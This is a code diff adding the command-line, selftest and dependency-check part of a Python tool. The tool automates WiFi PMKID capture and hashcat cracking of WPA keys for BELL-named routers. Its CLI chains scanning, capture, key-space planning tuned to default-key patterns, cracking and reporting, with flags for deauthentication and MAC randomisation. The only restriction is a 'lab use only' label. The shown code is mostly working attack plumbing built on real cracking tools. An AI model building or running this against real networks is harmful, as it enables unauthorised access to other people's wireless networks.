+    for anti in ("aaaaaaaa", "ssssssss", "99999999", "aaaaAAAA", "9999aaaa",
+                 "11111111", "abcdefgh", "qwertyui", "abababab"):
+        check(f"anti-candidate '{anti}' is rejected",
+              bool(anti_candidate_reasons(anti)), anti)
+    for good in ("A34rS45t", "A2F7F579", "b3ll726X", "Zk9mQ2wP"):
+        check(f"plausible key '{good}' is kept",
+              not anti_candidate_reasons(good), good)
+
+    # 7. the policy mask file removes the anti-candidates by construction
+    policy_path = Path("/tmp/kilo/bell-selftest-policy.hcmask")
+    masks, keyspace = build_policy_mask_file(policy_path, 8)
+    check("the policy file has one mask per class assignment", masks == 5796,
+          str(masks))
+    check("the policy keyspace is 26 percent smaller than 62^8",
+          0.70 < keyspace / 62 ** 8 < 0.75, f"{keyspace / 62 ** 8:.4f}")
+    policy_lines = policy_path.read_text().splitlines()
+    check("every policy line carries its own charsets",
+          all(line.count(",") == 3 for line in policy_lines[:50]),
+          policy_lines[0])
+    check("the policy file has no duplicate masks",
+          len({line.split(",")[-1] for line in policy_lines}) == masks)
+
+    # 8. the command line overrides must land on the right config keys
+    args = build_arg_parser().parse_args(
+        ["--cores", "8", "--max-hours", "6", "--speed", "450000",
+         "--backend", "hcxdumptool", "--devices", "1,2"]
+    )
+    cli_cfg = Config()
+    apply_overrides(cli_cfg, args)
+    check("--cores sets hashcat_cores", cli_cfg.get("hashcat_cores") == 8,
+          str(cli_cfg.get("hashcat_cores")))
+    check("--max-hours sets max_hours_per_step",
+          cli_cfg.get("max_hours_per_step") == 6.0,
+          str(cli_cfg.get("max_hours_per_step")))
+    check("--speed sets hashcat_speed", cli_cfg.get("hashcat_speed") == 450000.0,
+          str(cli_cfg.get("hashcat_speed")))
+    check("--backend sets capture_backend",
+          cli_cfg.get("capture_backend") == "hcxdumptool",
+          str(cli_cfg.get("capture_backend")))
+    check("--devices sets hashcat_device_ids",
+          cli_cfg.get("hashcat_device_ids") == "1,2",
+          str(cli_cfg.get("hashcat_device_ids")))
+
+    # 5. hashcat end to end with a single candidate
+    if run_hashcat_check and have("hashcat"):
+        with_tmp = Path("/tmp/kilo/bell-selftest.22000")
+        with_tmp.parent.mkdir(parents=True, exist_ok=True)
+        with_tmp.write_text(line + "\n", encoding="utf-8")
+        pot = with_tmp.with_suffix(".pot")
+        proc = run(
+            [
+                "taskset", "-c", "0",
+                "hashcat", "-m", "22000", "-a", "3",
+                "-1", "a",
+                "--potfile-path", str(pot),
+                "--quiet", "--force",
+                str(with_tmp),
+                "BELL?1?1?1?1?1?1?1",
+            ],
+            timeout=180,
+        )
+        found = show_cracked(with_tmp, pot)
+        check("hashcat cracked the 1-candidate mask", bool(found),
+              f"rc={proc.returncode}")
+        if found:
+            check("recovered key is correct",
+                  any(item.password == password for item in found), str(found))
+            check("recovered key maps back to the ESSID",
+                  any(item.essid == essid for item in found), str(found))
+    else:
+        print("  skip hashcat end-to-end check")
+
+    print(f"\n{'FAILED: ' + ', '.join(failures) if failures else 'all checks passed'}")
+    return 1 if failures else 0
+
+
+# --------------------------------------------------------------------------
+# command line interface
+# --------------------------------------------------------------------------
+
+
+def check_deps() -> int:
+    """Idempotent dependency check for WiFi adapters and toolchain."""
+    wifi_packages = [
+        "firmware-linux-nonfree",
+        "firmware-misc-nonfree",
+        "firmware-realtek",
+        "firmware-ath9k-htc",
+        "firmware-atheros",
+        "firmware-mediatek",
+        "iw",
+        "ethtool",
+    ]
+    tools = ["aircrack-ng", "hashcat", "wifite", "hcxdumptool", "hcxpcapngtool",
+             "iw", "tcpdump"]
+    print("== WiFi driver / firmware packages ==")
+    missing_pkgs = []
+    for pkg in wifi_packages:
+        r = subprocess.run(["dpkg", "-s", pkg], capture_output=True, text=True)
+        status = "ok" if r.returncode == 0 else "MISSING"
+        if r.returncode != 0:
+            missing_pkgs.append(pkg)
+        print("  [" + status + "] " + pkg)
+    print()
+    print("== Toolchain ==")
+    missing_tools = []
+    for t in tools:
+        if which(t):
+            print("  [ok] " + t)
+        else:
+            missing_tools.append(t)
+            print("  [MISSING] " + t)
+    if missing_pkgs or missing_tools:
+        print()
+        print("Missing items: " + ", ".join(missing_pkgs + missing_tools))
+        print("Install with (when network is available):")
+        if missing_pkgs:
+            print("  sudo apt-get install -y " + " ".join(missing_pkgs))
+        if missing_tools:
+            print("  sudo apt-get install -y " + " ".join(missing_tools))
+        return 1
+    print()
+    print("All dependencies present.")
+    return 0
+
+
+def build_arg_parser() -> argparse.ArgumentParser:
+    parser = argparse.ArgumentParser(
+        prog=APP,
+        description="BELL-series WiFi PMKID red-team workflow "
+                    "(authorized lab use only).",
+    )
+    parser.add_argument(
+        "command",
+        nargs="?",
+        default="tui",
+        choices=[
+            "tui", "preflight", "scan", "capture", "plan", "attack", "report",
+            "all", "selftest", "deps",
+        ],
+    )
+    parser.add_argument("--workdir", default=str(WORKDIR_DEFAULT))
+    parser.add_argument("--interface", default=None)
+    parser.add_argument("--essid-regex", default=None)
+    parser.add_argument("--mask-len", type=int, default=None)
+    parser.add_argument("--mask-charset", default=None)
+    parser.add_argument("--mask-order", choices=["effective", "requested"],
+                        default=None)
+    parser.add_argument("--backend", choices=["wifite", "hcxdumptool"],
+                        default=None)
+    parser.add_argument("--monitor-mode", choices=["physical", "airmon", "managed"],
+                        default=None)
+    parser.add_argument("--cores", type=int, default=None)
+    parser.add_argument("--devices", default=None,
+                        help="hashcat OpenCL device ids, e.g. 1,2 for two GPUs")
+    parser.add_argument("--max-hours", type=float, default=None)
+    parser.add_argument("--allow-huge", action="store_true")
+    parser.add_argument("--speed", type=float, default=None)
+    parser.add_argument("--wordlist", default=None)
+    parser.add_argument("--pmkid-timeout", type=int, default=None)
+    parser.add_argument("--scan-seconds", type=int, default=None)
+    parser.add_argument("--deauth", action="store_true")
+    parser.add_argument("--random-mac", action="store_true")
+    parser.add_argument("--dry-run", action="store_true")
+    parser.add_argument("--json", action="store_true")
+    parser.add_argument("--plain", action="store_true",
+                        help="force plain text mode (no curses)")
+    parser.add_argument("--no-hashcat-check", action="store_true")
+    return parser
+
+
+def apply_overrides(cfg: Config, args: argparse.Namespace) -> None:
+    # argument name -> configuration key
+    mapping = {
+        "interface": "interface",
+        "essid_regex": "essid_regex",
+        "mask_len": "mask_len",
+        "mask_charset": "mask_charset",
+        "mask_order": "mask_order",
+        "backend": "capture_backend",
+        "monitor_mode": "monitor_mode",
+        "cores": "hashcat_cores",
+        "max_hours": "max_hours_per_step",
+        "speed": "hashcat_speed",
+        "wordlist": "wordlist",
+        "pmkid_timeout": "pmkid_timeout",
+        "scan_seconds": "scan_seconds",
+        "devices": "hashcat_device_ids",
+    }
+    for arg, key in mapping.items():
+        value = getattr(args, arg, None)
+        if value is not None:
+            cfg.set(key, value)
+    if args.allow_huge:
+        cfg.set("allow_huge_keyspace", True)
+    if args.deauth:
+        cfg.set("allow_deauth", True)
+    if args.random_mac:
+        cfg.set("randomize_mac", True)
+
+
+def print_plan(plan: Sequence[Step], speed: Optional[float]) -> None:
+    print(f"{'step':<32} {'keyspace':>12} {'eta':>12}  detail")
+    for step in plan:
+        eta = human_time(step.est_seconds) if step.est_seconds else "-"
+        flag = f" [SKIP: {step.skip_reason}]" if step.skip_reason else ""
+        print(f"{step.name:<32} {human_count(step.keyspace):>12} {eta:>12}  "
+              f"{step.desc}{flag}")
+    if speed:
+        print(f"\nassumed throughput: {speed:,.0f} H/s")
+
+
+def main(argv: Optional[Sequence[str]] = None) -> int:
+    args = build_arg_parser().parse_args(argv)
+    workdir = Path(args.workdir).expanduser()
+    workdir.mkdir(parents=True, exist_ok=True)
+    for sub in ("hs", "captures", "candidates", "logs", "results", "masks"):
+        (workdir / sub).mkdir(parents=True, exist_ok=True)
+    chown_to_real_user(workdir)
+
+    if args.command == "selftest":
+        return selftest(run_hashcat_check=not args.no_hashcat_check)
+
+    if args.command == "deps":
+        return check_deps()
+
+    log = Log(workdir / "logs" / "bell-redteam.log")
+    cfg = Config.load(workdir / "config.json")
+    apply_overrides(cfg, args)
+    cfg.save(workdir / "config.json")
+
+    state = RunState(config=cfg, workdir=workdir, log=log)
+    workflow = Workflow(state)
+
+    # Auto-select a wireless interface when none is configured, so the user
+    # never has to type a device name.  Ralink USB adapters are preferred,
+    # then physical monitor-capable adapters, then anything else.
+    if not cfg.get("interface"):
+        chosen = preferred_interface(list_interfaces())
+        if chosen:
+            cfg.set("interface", chosen.name)
+            log(f"interface: auto-selected {chosen.name} "
+                f"(driver={adapter_driver(chosen.name) or 'unknown'})")
+        else:
+            if args.command not in ("tui", "selftest", "deps", "preflight"):
+                print("no wireless interface found; plug in a WiFi adapter "
+                      "or pass --interface")
+                return 2
+
+    if args.command == "tui":
+        return TUI(state).run(force_plain=getattr(args, "plain", False))
+
+    phase_map = {
+        "preflight": ["preflight"],
+        "scan": ["preflight", "scan"],
+        "capture": ["preflight", "scan", "capture", "filter"],
+        "plan": ["preflight", "scan", "capture", "filter", "plan"],
+        "attack": ["preflight", "scan", "capture", "filter", "plan", "attack"],
+        "report": ["preflight", "scan", "capture", "filter", "plan", "attack",
+                   "report"],
+        "all": ["preflight", "scan", "capture", "filter", "plan", "attack",
+                "report"],
+    }
+    phases = phase_map[args.command]
+
+    if args.dry_run and args.command in ("plan", "attack", "all"):
+        phases = [p for p in phases if p not in ("capture", "attack", "report")]
+        phases.append("plan")
+
+    # "plan" can review an existing capture without touching the radio
+    if args.command == "plan" and (workdir / "bell.22000").exists():
+        phases = ["preflight", "plan"]
+
+    workflow.run(phases)
+
+    if args.command == "plan" or (args.dry_run and "plan" in phases):
+        speed = detect_speed(cfg, workdir, log)
+        plan = state.plan or build_plan(
+            state.entries, cfg,
+            Path(cfg.get("_bell_hashes") or workdir / "bell.22000"),
+            speed, workdir / "masks",
+        )
+        if args.json:
+            print(json.dumps([s.to_dict() for s in plan], indent=2, default=str))
+        else:
+            print_plan(plan, speed)
+        return 0
+
+    if args.json:
+        print(json.dumps(state.payload or state.preflight, indent=2, default=str))
+    else:
+        if state.error:
+            print(f"error: {state.error}")
+        elif state.payload:
+            summary = state.payload
+            print(f"hashes {summary.get('hashes', 0)}  "
+                  f"cracked {summary.get('cracked_count', 0)}")
+            for item in summary.get("results", []):
+                if item.get("cracked"):
+                    print(f"  [OK] {item['essid']} {item['bssid']} {item['key']}")
+        else:
+            print("done")
+    return 1 if state.error else 0
+
+
+if __name__ == "__main__":
+    try:
+        sys.exit(main())
+    except KeyboardInterrupt:
+        sys.stderr.write("\ninterrupted\n")
+        sys.exit(130)
